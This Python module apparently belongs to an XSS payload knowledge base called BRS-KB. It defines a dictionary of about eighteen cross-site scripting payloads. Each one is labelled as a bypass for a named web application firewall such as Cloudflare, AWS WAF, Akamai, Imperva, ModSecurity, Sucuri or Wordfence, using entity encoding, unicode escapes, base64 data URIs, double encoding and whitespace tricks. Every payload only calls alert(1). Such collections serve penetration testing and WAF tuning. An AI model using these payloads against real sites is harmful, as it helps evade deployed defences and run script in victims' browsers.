#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created

WAF Bypass Payloads 2025 Edition
"""

from ..models import PayloadEntry


WAF_BYPASS_2025_DATABASE = {
    # ===== CLOUDFLARE BYPASSES 2025 =====
    "cf_2025_001": PayloadEntry(
        payload="<svg/onload=&#97&#108&#101&#114&#116(1)>",
        contexts=["html_content"],
        tags=["waf_bypass", "cloudflare", "html_entities"],
        severity="high",
        cvss_score=7.5,
        description="Cloudflare bypass via HTML entities without semicolons",
        reliability="medium",
        waf_evasion=True,
        bypasses=["cloudflare"],
    ),
    "cf_2025_002": PayloadEntry(
        payload="<img src=x onerror=\\u0061lert(1)>",
        contexts=["html_content"],
        tags=["waf_bypass", "cloudflare", "unicode"],
        severity="high",
        cvss_score=7.5,
        description="Cloudflare bypass via unicode escape",
        reliability="medium",
        waf_evasion=True,
        bypasses=["cloudflare"],
    ),
    "cf_2025_003": PayloadEntry(
        payload='<x/onclick=globalThis["ale"+"rt"](1)>click',
        contexts=["html_content"],
        tags=["waf_bypass", "cloudflare", "concat"],
        severity="high",
        cvss_score=7.5,
        description="Cloudflare bypass via string concat and globalThis",
        reliability="high",
        waf_evasion=True,
        bypasses=["cloudflare"],
    ),
    "cf_2025_004": PayloadEntry(
        payload="<audio src onloadstart=alert(1)>",
        contexts=["html_content"],
        tags=["waf_bypass", "cloudflare", "audio"],
        severity="high",
        cvss_score=7.5,
        description="Cloudflare bypass via audio onloadstart",
        reliability="medium",
        waf_evasion=True,
        bypasses=["cloudflare"],
    ),
    # ===== AWS WAF BYPASSES 2025 =====
    "aws_2025_001": PayloadEntry(
        payload="<svg><animate onbegin=alert(1)>",
        contexts=["html_content", "svg"],
        tags=["waf_bypass", "aws_waf", "svg"],
        severity="high",
        cvss_score=7.5,
        description="AWS WAF bypass via SVG animate",
        reliability="high",
        waf_evasion=True,
        bypasses=["aws_waf"],
    ),
    "aws_2025_002": PayloadEntry(
        payload='<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">CLICK</maction></math>',
        contexts=["html_content", "mathml"],
        tags=["waf_bypass", "aws_waf", "mathml"],
        severity="high",
        cvss_score=7.5,
        description="AWS WAF bypass via MathML",
        reliability="medium",
        waf_evasion=True,
        bypasses=["aws_waf"],
    ),
    # ===== AKAMAI BYPASSES 2025 =====
    "akamai_2025_001": PayloadEntry(
        payload="<details ontoggle=alert(1) open>",
        contexts=["html_content"],
        tags=["waf_bypass", "akamai", "details"],
        severity="high",
        cvss_score=7.5,
        description="Akamai bypass via details ontoggle",
        reliability="high",
        waf_evasion=True,
        bypasses=["akamai"],
    ),
    "akamai_2025_002": PayloadEntry(
        payload="<body/onpageshow=alert(1)>",
        contexts=["html_content"],
        tags=["waf_bypass", "akamai", "body"],
        severity="high",
        cvss_score=7.5,
        description="Akamai bypass via onpageshow",
        reliability="medium",
        waf_evasion=True,
        bypasses=["akamai"],
    ),
    # ===== IMPERVA BYPASSES 2025 =====
    "imperva_2025_001": PayloadEntry(
        payload="<svg%0aonload=alert(1)>",
        contexts=["html_content"],
        tags=["waf_bypass", "imperva", "newline"],
        severity="high",
        cvss_score=7.5,
        description="Imperva bypass via newline in tag",
        reliability="medium",
        waf_evasion=True,
        bypasses=["imperva"],
    ),
    "imperva_2025_002": PayloadEntry(
        payload="<input onfocus=alert(1) autofocus>",
        contexts=["html_content"],
        tags=["waf_bypass", "imperva", "autofocus"],
        severity="high",
        cvss_score=7.5,
        description="Imperva bypass via autofocus",
        reliability="high",
        waf_evasion=True,
        bypasses=["imperva"],
    ),
    # ===== MODSECURITY BYPASSES 2025 =====
    "modsec_2025_001": PayloadEntry(
        payload="<Img Src=x OnError=alert(1)>",
        contexts=["html_content"],
        tags=["waf_bypass", "modsecurity", "case"],
        severity="high",
        cvss_score=7.5,
        description="ModSecurity bypass via mixed case",
        reliability="low",
        waf_evasion=True,
        bypasses=["modsecurity"],
    ),
    "modsec_2025_002": PayloadEntry(
        payload='<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
        contexts=["html_content"],
        tags=["waf_bypass", "modsecurity", "base64"],
        severity="high",
        cvss_score=7.5,
        description="ModSecurity bypass via base64 data URI",
        reliability="medium",
        waf_evasion=True,
        bypasses=["modsecurity"],
    ),
    # ===== SUCURI BYPASSES 2025 =====
    "sucuri_2025_001": PayloadEntry(
        payload="<video><source onerror=alert(1)>",
        contexts=["html_content"],
        tags=["waf_bypass", "sucuri", "video"],
        severity="high",
        cvss_score=7.5,
        description="Sucuri bypass via video source",
        reliability="high",
        waf_evasion=True,
        bypasses=["sucuri"],
    ),
    # ===== WORDFENCE BYPASSES 2025 =====
    "wordfence_2025_001": PayloadEntry(
        payload='<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>',
        contexts=["html_content", "href"],
        tags=["waf_bypass", "wordfence", "entities"],
        severity="high",
        cvss_score=7.5,
        description="Wordfence bypass via hex entities",
        reliability="medium",
        waf_evasion=True,
        bypasses=["wordfence"],
    ),
    # ===== GENERIC WAF BYPASSES =====
    "generic_double_encode": PayloadEntry(
        payload="%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        contexts=["html_content", "url"],
        tags=["waf_bypass", "generic", "double_encode"],
        severity="high",
        cvss_score=7.5,
        description="Double URL encoding bypass",
        reliability="medium",
        waf_evasion=True,
    ),
    "generic_tab_break": PayloadEntry(
        payload="<img\tsrc=x\tonerror\t=\talert(1)>",
        contexts=["html_content"],
        tags=["waf_bypass", "generic", "tab"],
        severity="high",
        cvss_score=7.5,
        description="Tab character WAF bypass",
        reliability="medium",
        waf_evasion=True,
    ),
    "generic_newline_break": PayloadEntry(
        payload="<img\nsrc=x\nonerror\n=\nalert(1)>",
        contexts=["html_content"],
        tags=["waf_bypass", "generic", "newline"],
        severity="high",
        cvss_score=7.5,
        description="Newline character WAF bypass",
        reliability="medium",
        waf_evasion=True,
    ),
    "generic_forward_slash": PayloadEntry(
        payload="<img/src=x/onerror=alert(1)>",
        contexts=["html_content"],
        tags=["waf_bypass", "generic", "slash"],
        severity="high",
        cvss_score=7.5,
        description="Forward slash separator bypass",
        reliability="high",
        waf_evasion=True,
    ),
}

WAF_2025_TOTAL_PAYLOADS = len(WAF_BYPASS_2025_DATABASE)
